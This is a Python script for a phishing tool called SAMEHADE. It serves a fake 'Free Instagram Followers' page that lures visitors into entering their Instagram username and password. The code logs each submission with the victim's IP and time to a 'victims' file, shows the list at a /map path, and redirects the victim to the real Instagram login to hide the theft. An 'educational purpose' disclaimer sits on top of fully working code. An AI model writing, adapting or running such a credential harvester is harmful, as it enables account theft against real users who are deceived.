#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime

class InstagramFreeFollowers(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_instagram_page()
        elif self.path == '/map':
            self.send_map()
        else:
            self.send_404()

    def send_instagram_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        html = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Instagram Followers - Instant 10K+</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;}
        .container{max-width:450px;width:90%;background:white;border-radius:25px;box-shadow:0 25px 50px rgba(0,0,0,0.2);overflow:hidden;}
        .header{background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);padding:30px 25px;text-align:center;color:white;}
        .header h1{font-size:28px;margin-bottom:10px;font-weight:700;}
        .header p{font-size:16px;opacity:0.9;}
        .form{padding:40px 30px;}
        .input-group{position:relative;margin-bottom:25px;}
        .input-group input{width:100%;padding:18px 20px;border:2px solid #e1e5e9;border-radius:15px;font-size:16px;transition:all 0.3s ease;outline:none;}
        .input-group input:focus{border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,0.1);}
        .input-group input{padding-left:20px;}
        .submit-btn{width:100%;padding:18px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border:none;border-radius:15px;font-size:18px;font-weight:600;cursor:pointer;transition:all 0.3s ease;text-transform:uppercase;letter-spacing:1px;}
        .submit-btn:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(102,126,234,0.4);}
        .features{margin-top:30px;padding:25px 30px;background:#f8f9fa;border-radius:20px;}
        .feature{list-style:none;display:flex;align-items:center;margin-bottom:15px;padding-left:25px;position:relative;}
        .feature::before{content:"";position:absolute;left:0;width:6px;height:6px;background:#667eea;border-radius:50%;}
        .footer{padding:25px 30px;text-align:center;color:#666;font-size:14px;}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Free Instagram Followers</h1>
            <p>Get 10,000+ Real Followers Instantly - No Survey!</p>
        </div>
        <div class="form">
            <form method="POST" action="/capture">
                <div class="input-group">
                    <input type="text" name="username" placeholder="Instagram Username" required>
                </div>
                <div class="input-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="submit-btn">Claim 10K Followers Now!</button>
            </form>
        </div>
        <ul class="features">
            <li class="feature">10,000+ Real Active Followers</li>
            <li class="feature">Instant Delivery (5-10 mins)</li>
            <li class="feature">No Password Required (Optional)</li>
            <li class="feature">Works on All Countries</li>
        </ul>
        <div class="footer">
            Trusted by 2M+ Instagram Users • 100% Safe & Free
        </div>
    </div>
</body>
</html>'''
        self.wfile.write(html.encode())

    def send_map(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        try:
            with open('samehade_victims.txt', 'r') as f:
                victims = f.read()
        except:
            victims = "No victims captured yet"
        self.wfile.write(f"VICTIMS:\n{victims}".encode())

    def send_404(self):
        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        if self.path == '/capture':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            data = parse_qs(post_data)

            username = data.get('username', [''])[0]
            password = data.get('password', [''])[0]
            ip = self.client_address[0]
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            print("\n" + "="*50)
            print("INSTAGRAM HIT!")
            print(f"Username: {username}")
            print(f"Password: {password}")
            print(f"IP: {ip}")
            print(f"Time: {timestamp}")
            print("="*50)

            victim_data = f"{timestamp} | {username}:{password} | {ip}\n"
            with open('samehade_victims.txt', 'a') as f:
                f.write(victim_data)

            self.send_response(302)
            self.send_header('Location', 'https://www.instagram.com/accounts/login/')
            self.end_headers()

import random
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

# ----------------------------
# PROFESSIONAL ANSI COLORS
# ----------------------------
COLORS = {
    "blue": "\033[94m",
    "cyan": "\033[96m",
    "green": "\033[92m",
    "purple": "\033[95m",
    "white": "\033[97m",
    "yellow": "\033[93m",
    "red": "\033[91m",
    "reset": "\033[0m"
}

# Choose fresh colors every run
BANNER_COLOR = random.choice([
    COLORS["blue"],
    COLORS["cyan"],
    COLORS["green"],
    COLORS["purple"]
])

TEXT_COLOR = random.choice([
    COLORS["cyan"],
    COLORS["green"],
    COLORS["purple"],
    COLORS["white"]
])

WARNING_COLOR = COLORS["yellow"]
ERROR_COLOR = COLORS["red"]
RESET = COLORS["reset"]

# ----------------------------
# ASCII BANNER
# ----------------------------
banner_lines = [
    "  ███████╗ █████╗ ███╗   ███╗███████╗██╗  ██╗ █████╗ ██████╗ ███████╗",
    "  ██╔════╝██╔══██╗████╗ ████║██╔════╝██║  ██║██╔══██╗██╔══██╗██╔════╝",
    "  ███████╗███████║██╔████╔██║█████╗  ███████║███████║██║  ██║█████╗  ",
    "  ╚════██║██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██║██╔══██║██║  ██║██╔══╝  ",
    "  ███████║██║  ██║██║ ╚═╝ ██║███████╗██║  ██║██║  ██║██████╔╝███████╗",
    "  ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝"
]

# ----------------------------
# MAIN
# ----------------------------
if __name__ == "__main__":

    print()
    for line in banner_lines:
        print(f"{BANNER_COLOR}{line}{RESET}")

    print(f"""
{TEXT_COLOR}  ─────────────────────────────────────────
   Project : SAMEHADE
   Author  : Adwaith Pramod
   Usage   : Educational & Research Purpose Only
{WARNING_COLOR}   Warning : Illegal or malicious use is prohibited.
             The author is not responsible for misuse.
{TEXT_COLOR}  ─────────────────────────────────────────
{RESET}
""")

    choice = input(f"{WARNING_COLOR}[?] Press ENTER to start server or type 'exit' to quit : {RESET}")
    if choice.lower() == "exit":
        print(f"{ERROR_COLOR}[!] Exiting SAMEHADE...{RESET}")
        sys.exit(0)

    server = HTTPServer(("0.0.0.0", 8080), InstagramFreeFollowers)
    print(f"{TEXT_COLOR}[*] SAMEHADE server starting...{RESET}")
    print(f"{TEXT_COLOR}[*] URL : http://localhost:8080{RESET}")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{ERROR_COLOR}[!] SAMEHADE server stopped by user.{RESET}")
        server.server_close()
        sys.exit(0)
    
